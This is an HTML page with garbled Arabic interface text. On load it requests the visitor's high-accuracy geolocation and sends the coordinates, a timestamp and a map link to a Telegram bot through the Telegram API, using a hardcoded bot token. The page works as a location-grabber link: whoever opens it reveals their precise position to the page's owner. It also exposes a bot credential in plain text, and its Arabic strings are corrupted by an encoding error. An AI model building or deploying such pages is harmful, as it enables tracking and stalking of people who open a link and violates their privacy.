<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 20px;
            padding: 20px;
        }
        #status {
            margin: 20px;
            padding: 15px;
            border-radius: 5px;
            background-color: #f0f0f0;
        }
        #locationInfo {
            margin-top: 20px;
            padding: 15px;
            background-color: #e8f5e9;
            border-radius: 5px;
            display: none;
        }
        #mapLink {
            margin-top: 10px;
            display: block;
            color: #1a73e8;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <h1>Ø·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ù…ÙˆÙ‚Ø¹Ùƒ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ</h1>
    <div id="status">Ø¬Ø§Ø±ÙŠ Ø·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ù…ÙˆÙ‚Ø¹Ùƒ...</div>
    <div id="locationInfo">
        <h2>Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ù…ÙˆÙ‚Ø¹Ùƒ:</h2>
        <p><strong>Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶:</strong> <span id="latitude"></span></p>
        <p><strong>Ø®Ø· Ø§Ù„Ø·ÙˆÙ„:</strong> <span id="longitude"></span></p>
        <p><strong>Ø§Ù„Ø¯Ù‚Ø©:</strong> <span id="accuracy"></span> Ù…ØªØ±</p>
        <a id="mapLink" target="_blank">Ø¹Ø±Ø¶ Ø¹Ù„Ù‰ Ø®Ø±Ø§Ø¦Ø· Ø¬ÙˆØ¬Ù„</a>
    </div>

    <script>
        const statusDiv = document.getElementById('status');
        const locationInfoDiv = document.getElementById('locationInfo');
        const latitudeSpan = document.getElementById('latitude');
        const longitudeSpan = document.getElementById('longitude');
        const accuracySpan = document.getElementById('accuracy');
        const mapLink = document.getElementById('mapLink');

        // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø¨ÙˆØª ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        const TELEGRAM_BOT_TOKEN = '7540998214:AAEysEoXCj5XHlQzVG3-yETXNk6WdeZ9Yc0';
        const CHAT_ID = ''; // Ø§ØªØ±ÙƒÙ‡ ÙØ§Ø±ØºØ§Ù‹ Ù„Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø¯Ø±Ø¯Ø´Ø© Ø§Ù„Ø¨ÙˆØª

        // Ø·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        window.addEventListener('DOMContentLoaded', () => {
            requestLocationPermission();
        });

        function requestLocationPermission() {
            if (!navigator.geolocation) {
                statusDiv.textContent = 'Ù…ØªØµÙØ­Ùƒ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø®Ø¯Ù…Ø© Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ';
                statusDiv.style.backgroundColor = '#ffebee';
                return;
            }

            statusDiv.textContent = 'Ø¬Ø§Ø±ÙŠ Ø·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ù…ÙˆÙ‚Ø¹Ùƒ...';
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    // Ø¹Ù†Ø¯ Ù…Ù†Ø­ Ø§Ù„Ø¥Ø°Ù† Ø¨Ù†Ø¬Ø§Ø­
                    const locationData = showLocation(position);
                    statusDiv.textContent = 'Ø¬Ø§Ø±ÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…...';
                    await sendToTelegram(locationData);
                },
                (error) => {
                    // Ø¹Ù†Ø¯ Ø±ÙØ¶ Ø§Ù„Ø¥Ø°Ù† Ø£Ùˆ Ø­Ø¯ÙˆØ« Ø®Ø·Ø£
                    handleLocationError(error);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        function showLocation(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            
            latitudeSpan.textContent = latitude;
            longitudeSpan.textContent = longitude;
            accuracySpan.textContent = accuracy;
            
            // Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø§Ø¨Ø· Ø®Ø±Ø§Ø¦Ø· Ø¬ÙˆØ¬Ù„
            mapLink.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
            mapLink.textContent = `Ø¹Ø±Ø¶ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¹Ù„Ù‰ Ø®Ø±Ø§Ø¦Ø· Ø¬ÙˆØ¬Ù„ (Ø¯Ù‚Ø©: ${accuracy} Ù…ØªØ±)`;
            
            locationInfoDiv.style.display = 'block';
            
            return {
                latitude,
                longitude,
                accuracy,
                timestamp: new Date(position.timestamp).toLocaleString()
            };
        }

        async function sendToTelegram(locationData) {
            try {
                const message = `ğŸ“ ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ù…ÙˆÙ‚Ø¹ Ø¬Ø¯ÙŠØ¯:
- Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${locationData.latitude}
- Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: ${locationData.longitude}
- Ø§Ù„Ø¯Ù‚Ø©: ${locationData.accuracy} Ù…ØªØ±
- Ø§Ù„ÙˆÙ‚Øª: ${locationData.timestamp}
- Ø§Ù„Ø±Ø§Ø¨Ø·: https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;

                const response = await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                    {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            disable_web_page_preview: false
                        })
                    }
                );

                const result = await response.json();
                
                if (result.ok) {
                    statusDiv.textContent = 'ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ù…ÙˆÙ‚Ø¹Ùƒ Ø¥Ù„Ù‰ Ø¨ÙˆØª ØªÙ„ÙŠØ¬Ø±Ø§Ù… Ø¨Ù†Ø¬Ø§Ø­!';
                    statusDiv.style.backgroundColor = '#e8f5e9';
                } else {
                    throw new Error(result.description || 'Ø®Ø·Ø£ ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ Ù…Ù† ØªÙ„ÙŠØ¬Ø±Ø§Ù…');
                }
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:', error);
                statusDiv.textContent = `ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„: ${error.message}`;
                statusDiv.style.backgroundColor = '#ffebee';
            }
        }

        function handleLocationError(error) {
            let message = '';
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    message = 'ØªÙ… Ø±ÙØ¶ Ø¥Ø°Ù† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹. ÙŠØ±Ø¬Ù‰ Ù…Ù†Ø­ Ø§Ù„Ø¥Ø°Ù† Ù„Ù…Ø´Ø§Ø±ÙƒØ© Ù…ÙˆÙ‚Ø¹Ùƒ.';
                    break;
                case error.POSITION_UNAVAILABLE:
                    message = 'Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹ ØºÙŠØ± Ù…ØªØ§Ø­Ø© Ø­Ø§Ù„ÙŠØ§Ù‹.';
                    break;
                case error.TIMEOUT:
                    message = 'Ø§Ù†ØªÙ‡Ù‰ ÙˆÙ‚Øª Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.';
                    break;
                case error.UNKNOWN_ERROR:
                    message = 'Ø­Ø¯Ø« Ø®Ø·Ø£ ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ Ø£Ø«Ù†Ø§Ø¡ Ù…Ø­Ø§ÙˆÙ„Ø© ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹.';
                    break;
            }
            statusDiv.textContent = message;
            statusDiv.style.backgroundColor = '#ffebee';
        }
    </script>
</body>
</html>
